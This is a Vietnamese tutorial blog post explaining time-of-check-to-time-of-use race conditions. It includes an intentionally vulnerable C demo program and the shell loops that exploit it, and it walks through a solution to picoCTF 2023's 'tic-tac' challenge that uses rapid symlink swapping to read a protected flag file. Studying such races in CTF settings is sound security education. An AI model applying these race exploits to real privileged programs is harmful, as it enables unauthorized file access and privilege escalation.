---
title: "TOCTOU attack"
date: 2023-07-04
draft: false
tags: ["toctou", "pwn"]
showTableOfContents: true
---
Trong bài này mình sẽ giới thiệu qua về TOCTOU (time of check - time of use), một hướng khai thác trong race condition cũng như cách setup đơn giản để khai thác và giải một số bài minh hoạ. 

## Giới thiệu
Race condition là một lỗi xảy ra khi thực hiện một loạt các context switch giữa một process này với một process khác nhưng các process đấy lại xảy ra mâu thuẫn với nhau. TOCTOU là một dạng trong số các mâu thuẫn đấy và xảy ra khi chương trình check một điều kiện nào đó trước khi thực hiện công việc bất kỳ nhưng khi thực hiện context switch thì điều kiện đấy sẽ không còn đúng nữa và sẽ cho phép dẫn tới privilege escalation hoặc đọc ghi file ngoài ý muốn.

### 1. Nguyên nhân
Nguyên nhân chính của việc dẫn đến race condition là do máy tính cho phép thực hiện multitask. Điều này giống như việc đang mở một task Discord và một task Chrome. Máy tính sẽ gây cho ta một ngộ nhận là các task này hoạt động song song với nhau nhưng thực chất là từng process trong task của Discord sẽ đan xen với từng process trong task của Chrome. Nhưng do tốc độ hoạt động của CPU quá nhanh nên ta nhầm tưởng chúng hoạt động song song. Điều này "khá tương tự" cách mắt bạn thấy ánh sáng từ đèn huỳnh quang. Về bản chất là nó chớp rồi tắt nhưng do dòng điện xoay chiều có tần số lớn nên mình tưởng nó luôn sáng.

![](https://hackmd.io/_uploads/Bk1baU-K3.png)

Hình 1 : Việc một process thực hiện đơn lẽ

![](https://hackmd.io/_uploads/BJ_NpLZK2.png)

Hình 2 : Lầm tưởng chạy 2 process song song

![](https://hackmd.io/_uploads/Sk9Ia8ZF3.png)

Hình 3 : Thực chất việc máy tính xử lý. Việc chuyển từ công việc của một process này sang công việc của một process khác được gọi là context switch


### 2. TOCTOU

Đây là một số khả năng khi ta chạy đa luồng 2 process cùng access vào 1 file:

![](https://hackmd.io/_uploads/SJ2MA8ZY3.png)

Một trong số các khả năng đấy sẽ có tìm ẩn nguy hiểm. Ta thấy khả năng đầu tiên như sau

![](https://hackmd.io/_uploads/Hy_cCI-F3.png)

P1 và P2 cùng `check_input` trong cùng một môi trường sau đó P1 `do_action` với môi trường đó rồi sau đấy P2 lại `do_action` với môi trường đã bị P1 thay đổi => có bug

Trong khả năng thứ 2 thì lại an toàn do thực hiện xong process này mới tới process khác

![](https://hackmd.io/_uploads/rJFF7w-Fn.png)

Trong các trường hợp còn lại thì process sau đều thực hiện `do_action` mà không `check_input` lại sau khi các process trước đó đã có tác động tới môi trường => có bug

![](https://hackmd.io/_uploads/BJ4_LwbKn.png)

## Setup, demo
### 1. Setup

Đầu tiên tạo file cần test và combile nó. Ở đây mình tạo file `vuln.c` 

```clike=
#include <sys/types.h>
#include <sys/stat.h>
#include <libgen.h>
#include <stddef.h>
#include <fcntl.h>
int main( int argc, char **argv)
{
    int fd = open(argv[1],O_WRONLY | O_CREAT | O_TRUNC,0755);
    write(fd,"#!/bin/sh\necho SAFE\n",20);
    close(fd);                      
    execl("/bin/sh","/bin/sh",argv[1],NULL);
}
```

![](https://hackmd.io/_uploads/rJ9jaw-F3.png)

Code này sẽ ghi bash script vào file đến từ argument đầu của ta và thực thi nó

Tiếp theo tạo thêm flag, file để test exploit : 

- file flag
- file catflag là bash script dùng để cat flag
```bash!
#!/bin/sh
cat flag
```

![](https://hackmd.io/_uploads/SJT6qFWt2.png)


### 2. Demo exploit
#### a. Bài setup 
Ở đây ta chia hướng hoạt động của chương trình thành 3 việc nhỏ:
 - Mở file từ argument đầu
 - Ghi file
 - Thực thi file

Ta có nhận xét là chương trình không check việc file đang thực thi có đúng là file ta đã mở không nên có có thể tấn công bằng TOCTOU nhờ vào file `catflag` cho sẵn.

![](https://hackmd.io/_uploads/HkO1SdbK2.png)

Ta có hướng tấn công như sau : tạo một process chạy song song để ghi đè `cat flag` vào sau khi process gốc thực hiện xong việc "ghi file". Để thực hiện được điều đó ta cần timing hợp lý (tuỳ vào nhân phẩm).

![](https://hackmd.io/_uploads/r1gGXuZF2.png)


Do đó ta viết shell script để spam việc copy content của file `catflag` sang file `test` tạo ra từ chương trình

```bash!
 while /bin/true; do cp -v catflag test;done
```

![](https://hackmd.io/_uploads/HkKTotZF3.png)

Sau đó ta mở tab khác để chạy chương trình gốc.

![](https://hackmd.io/_uploads/BJXV2Kbth.png)

Ta có nhận xét là không phải cứ chạy là rà flag mà tuỳ vào thời cơ.

#### b. tic-tac (PICO-CTF-2023)
Đề bài cho ta 3 file gồm: flag.txt, src.cpp và file binary txtreader.

File source như sau:
```clike=
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```

Ta cũng có thể chia cách hoạt động của chương trình thành 3 hướng như sau:
- Nhận input
- Check input
- Mở input 

Do ở đây không có sẵn file nào giúp "thay thế" như trên nên ta sẽ lợi dụng bằng linking (ln) qua một file thứ 3.

Ta chia công việc linking thành 2 phần như sau
- Link file `test` với file `src.c` bằng `ln -sf test src.c`
- Link file `test` với file `flag.txt` bằng `ln -sf test flag.txt`

Mục đích của ta là chạy 2 chương trình cùng lúc để trigger context giống ảnh

![](https://hackmd.io/_uploads/SJ1hf9bF2.png)

Do file `src.cpp` khá dài nên mình `ln` qua file thứ 3 tên `lmao`, về bản chất thì logic không thay đổi .

![](https://hackmd.io/_uploads/r1s0dqWY2.png)

Tiếp theo mình chạy lệnh này để thực hiện việc spam `ln` liên tiếp. Trong đó dấu `&` cuối cho phép ta thực hiện tiếp mà không phải đợi lệnh này xong. 

```bash
while true ; do ln -sf flag.txt test; ln -sf lmao test;done &
```
Cuối cùng chạy lệnh này để trigger toctou bằng cách spam tiếp chương trình gốc
```bash
for i in {1..100}; do ./txtreader test ;done
```

![](https://hackmd.io/_uploads/HyJ6tqZF2.png)

Và hên là ta đã có flag

## Tham khảo
1. [pwn.college](https://pwn.college/system-security/race-conditions)
2. [Exploiting a Race Condition](https://samsclass.info/127/proj/E10.htm) 